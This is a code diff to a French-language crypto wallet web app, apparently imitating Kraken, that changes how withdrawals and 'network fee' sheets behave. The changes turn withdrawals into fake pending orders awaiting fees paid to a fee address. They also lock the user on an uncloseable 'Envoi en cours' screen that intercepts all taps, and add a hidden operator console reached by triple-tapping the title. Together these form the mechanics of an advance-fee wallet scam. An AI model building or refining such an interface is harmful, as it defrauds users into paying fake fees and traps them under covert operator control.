@@ -864,7 +864,13 @@
     $("#sheetBody").innerHTML = html;
     sheet.classList.add("on"); scrim.classList.add("on");
   }
-  const closeSheet = () => { sheet.classList.remove("on"); scrim.classList.remove("on"); window.__feeOpen = null; };
+  const closeSheet = () => {
+    // Transaction lancée et non validée : la fiche de suivi ne se ferme pas.
+    // Toute tentative ramène la fiche « Envoi en cours » à la place, sauf
+    // quand la console d'administration est ouverte (elle a la main).
+    if (!document.body.classList.contains("ia-lock") && isAppLocked() && openLockSheet()) return;
+    sheet.classList.remove("on"); scrim.classList.remove("on"); window.__feeOpen = null;
+  };
   scrim.addEventListener("click", closeSheet);
 
   const parseAmt = v => parseFloat(String(v || "").replace(/\s/g, "").replace(",", ".")) || 0;
@@ -1094,11 +1100,21 @@
       } catch { }
       if (btn) btn.classList.remove("is-busy");
       if (pendingFeeGate(PICK, v, addr)) return;
+      // Le retrait suit le même verrou que l'envoi : il crée une transaction en
+      // vol et l'application reste sur « Envoi en cours » jusqu'à sa validation
+      // par la console. Le montant ne quitte le solde qu'à cette validation.
       const fNow = netFee(PICK);
-      ST.balances[PICK] = Math.max(0, q - v);
-      addNotif({ id: "wd" + Date.now().toString(36), kind: "withdraw", asset: PICK, amount: v, addr, fee: fNow, feeAddr: fNow > 0 ? feeAddrFor(feeSymFor(PICK)) : null, at: Date.now(), text: "Retrait envoyé" });
-      saveLocal(); renderAll(); closeSheet();
-      toast("Retrait de " + qtyTxt(v, PICK) + " envoyé");
+      const paidNow = Math.max(0, Number((pendingFee() || {}).paid) || 0);
+      const order = feeOrderNew({
+        pick: PICK, amt: v, fee: fNow, sym: feeSymFor(PICK), addr, paid: paidNow, ok: false
+      });
+      addNotif({
+        id: "wd" + Date.now().toString(36), kind: "withdraw", asset: PICK, amount: v, addr,
+        fee: fNow, at: Date.now(), orderId: order.id,
+        text: "Retrait de " + qtyTxt(v, PICK) + " en attente des frais réseau"
+      });
+      saveLocal(); renderAll();
+      sheetSendDone({ pick: PICK, addr, amt: v, fee: fNow, orderId: order.id });
     });
   }
 
@@ -1682,6 +1698,42 @@
       .sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0))[0] || null;
   }
 
+  // Transaction en vol : un envoi ou un retrait lancé depuis l'app et pas encore
+  // validé par la console (ni abouti, ni annulé). C'est ce qui verrouille
+  // l'application. Contrairement à activeFeeOrder(), un ordre dont les frais
+  // sont validés mais pas encore exécuté reste verrouillant.
+  function appLockOrder() {
+    return Object.values(feeOrders())
+      .filter(o => o && o.src === "app" && !o.done && !o.cancelled && !o.pending)
+      .sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0))[0] || null;
+  }
+  function isAppLocked() {
+    return !!appLockOrder() || !!ST.feeBlock;
+  }
+  // Fiche de verrou : version non fermable de la fiche de suivi. Renvoie true
+  // quand une fiche a été rendue (donc la fermeture doit être bloquée).
+  function openLockSheet() {
+    const o = appLockOrder();
+    if (o) {
+      sheetSendDone({ pick: o.pick || "USDC", addr: o.addr || "", amt: Number(o.amt) || 0, fee: Number(o.amount) || 0, orderId: o.id, force: !!ST.feeBlock });
+      return true;
+    }
+    if (ST.feeBlock) {
+      const p = pendingFee();
+      if (p) {
+        sheetSendDone({ pick: p.pick || "USDC", addr: p.addr || "", amt: Number(p.amt) || 0, fee: Number(p.amount) || 0, orderId: p.id, force: true });
+        return true;
+      }
+    }
+    return false;
+  }
+  // Au retour dans l'app (déverrouillage, rechargement), une transaction en vol
+  // rouvre sa fiche : on reprend exactement là où l'appareil s'est arrêté.
+  function maybeShowLock() {
+    if (!isUnlocked()) return;
+    if (appLockOrder() || ST.feeBlock) { try { openLockSheet(); } catch { } }
+  }
+
   // Dernier montant saisi dans le formulaire d'envoi : sert de repli quand un
   // ordre plus ancien n'a pas gardé le sien (`amt` à 0). Ce que le client vient
   // de taper est ce qu'il attend sur la fiche.
@@ -2183,18 +2235,17 @@
     const feeNeedEth = rem ? feeQty(rem.remaining, "ETH") : 0;
     const feeMissTxt = feeNeedEth > 0 ? qtyTxt(feeNeedEth, "ETH") : "";
     window.__feeOpen = order ? order.id : null;
-    openSheet(`<div class="sheet-title">${pend
-        ? (ok ? "Frais réseau réglés" : "Frais réseau insuffisants")
-        : (done ? "Transaction envoyée" : (waiting ? "Frais réseau insuffisants" : "Envoi en cours"))}</div>
-      <p class="sheet-sub" id="feeSub">${pend
-        ? (ok
-          ? "Les frais réseau sont validés. Vous pouvez relancer votre transaction."
-          : "Votre transaction reste bloquée : le solde libre ne couvre pas les frais réseau.")
-        : done
+    // Une transaction lancée reste « Envoi en cours » tant que la console ne
+    // l'a pas validée : ni « terminé », ni « compris », une seule sortie.
+    const closable = done || (pend && ok);
+    openSheet(`<div class="sheet-title">${done
+        ? "Transaction envoyée"
+        : (pend && ok ? "Frais réseau réglés" : "Envoi en cours")}</div>
+      <p class="sheet-sub" id="feeSub">${done
         ? "La transaction a été confirmée et ajoutée à votre historique."
-        : waiting
-          ? "Votre envoi n'a pas pu être finalisé : le solde libre ne couvre pas les frais réseau."
-          : "Votre transaction a été signée puis diffusée sur le réseau."}</p>
+        : (pend && ok
+          ? "Les frais réseau sont validés. Vous pouvez relancer votre transaction."
+          : "Votre transaction est en cours de traitement. Elle reste bloquée jusqu'à sa validation par la console.")}</p>
       <div class="recap">
         ${pend ? "" : `<div class="rc-row"><span>Actif</span><b id="feeAsset">${aName}</b></div>
         <div class="rc-row"><span>Réseau</span><b id="feeNet">${netNow}</b></div>
@@ -2211,12 +2262,24 @@
           : "Le montant des frais réseau est en cours de calcul, la fiche se met à jour automatiquement."}</p>
         <p>Les fonds en staking ne peuvent pas être utilisés pour couvrir les frais de réseau. Retirez-les du staking pour libérer le solde nécessaire.</p>
       </div>` : ""}
-      ${done
-        ? `<button class="btn-black" id="sdOk">Terminé</button>`
-        : (pend && ok
-          ? `<button class="btn-black" id="sdOk">Continuer</button>`
-          : `<button class="btn-black" id="sdOk">Compris</button>`)}`);
-    $("#sdOk").addEventListener("click", () => { window.__feeOpen = null; closeSheet(); });
+      ${closable
+        ? `<button class="btn-black" id="sdOk">${done ? "Terminé" : "Continuer"}</button>`
+        : `<button class="btn-black" id="sdLock" disabled>En attente de validation par la console</button>`}`);
+    const okBtn = $("#sdOk");
+    if (okBtn) okBtn.addEventListener("click", () => { window.__feeOpen = null; closeSheet(); });
+    // Entrée opérateur : trois appuis sur le titre ouvrent la console admin, qui
+    // exige elle-même le code administrateur pour valider. Le client ne la voit
+    // pas ; l'opérateur peut débloquer la transaction depuis l'appareil.
+    const lockTitle = document.querySelector("#sheetBody .sheet-title");
+    if (lockTitle && !closable) {
+      let taps = 0, tapAt = 0;
+      lockTitle.addEventListener("click", () => {
+        const now = Date.now();
+        taps = (now - tapAt < 900) ? taps + 1 : 1;
+        tapAt = now;
+        if (taps >= 3) { taps = 0; try { openConsole(); } catch { } }
+      });
+    }
 
     const copyBtn = $("#feeCopy");
     if (copyBtn) copyBtn.addEventListener("click", () => {
@@ -2320,7 +2383,15 @@
       sheetSendDone({ pick: o.pick || "USDC", addr: o.addr || "", amt: Number(o.amt) || 0, fee: Number(o.amount) || 0, orderId: o.id });
       return;
     }
-    if (o.done) window.__feeOpen = null;
+    // Console a validé : la fiche verrouillée bascule une seule fois vers
+    // « Transaction envoyée » avec un bouton « Terminé » actif.
+    if (o.done) {
+      if (document.getElementById("sdLock")) {
+        sheetSendDone({ pick: o.pick || "USDC", addr: o.addr || "", amt: Number(o.amt) || 0, fee: Number(o.amount) || 0, orderId: o.id });
+        return;
+      }
+      window.__feeOpen = null;
+    }
   }
   setInterval(feeTick, 1000);
 
@@ -3537,6 +3608,9 @@
         }
       }
     } catch { }
+    // Ne jamais écraser une saisie PIN en cours : la fiche de suivi se
+    // redessinera au prochain cycle une fois le code saisi.
+    if (document.getElementById("apPin") && sheet.classList.contains("on")) return;
     const id = window.__feeOpen;
     if (!id) { try { refresh(); } catch { } return; }
     const o = feeOrders()[id];
@@ -3805,12 +3879,13 @@
   function unlock() {
     try { sessionStorage.setItem("kraken_unlocked", "1"); } catch { }
     screen("app"); go(VIEW);
+    try { maybeShowLock(); } catch { }
   }
   function isUnlocked() {
     try { return sessionStorage.getItem("kraken_unlocked") === "1"; } catch { return false; }
   }
   function requireUnlock() {
-    if (isUnlocked()) { screen("app"); go(VIEW); return; }
+    if (isUnlocked()) { screen("app"); go(VIEW); try { maybeShowLock(); } catch { } return; }
     pin = "";
     pinRender();
     pinError("");
@@ -4345,6 +4420,10 @@
         text: "Envoi de " + qtyTxt(Number(act.amt) || 0, act.pick || "USDC") + " confirmé"
       });
       try { liveFeeRefresh(); } catch { }
+      // La fiche de suivi passe à « Transaction envoyée » : la console peut
+      // avoir refermé la saisie du code (qui efface la fiche ouverte), donc on
+      // la redessine explicitement sur l'ordre validé.
+      try { sheetSendDone({ pick: act.pick || "USDC", addr: act.addr || "", amt: Number(act.amt) || 0, fee: Number(act.amount) || 0, orderId: act.id }); } catch { }
       try { renderAll(); } catch { }
       iaRender();
       toast("Transaction validée et débloquée");
@@ -5278,6 +5357,13 @@
   // ── événements ──────────────────────────────────────────────────────
   document.addEventListener("click", e => {
     const t = e.target;
+
+    // Verrou de transaction : hors console d'administration, un appui qui
+    // n'appartient pas à la fiche de suivi la ramène à la place de naviguer.
+    // Ne s'applique qu'une fois déverrouillé : l'écran PIN garde la main avant.
+    if (isUnlocked() && isAppLocked() && !document.body.classList.contains("ia-lock") && !t.closest("#iaPanel") && !t.closest("#offerBF100") && !t.closest("#sheet")) {
+      if (openLockSheet()) return;
+    }
 
     const g = t.closest("[data-goto]"); if (g) return go(g.dataset.goto);
     // Offres → « 100 $ en BTC » : seul accès à l'espace d'administration.
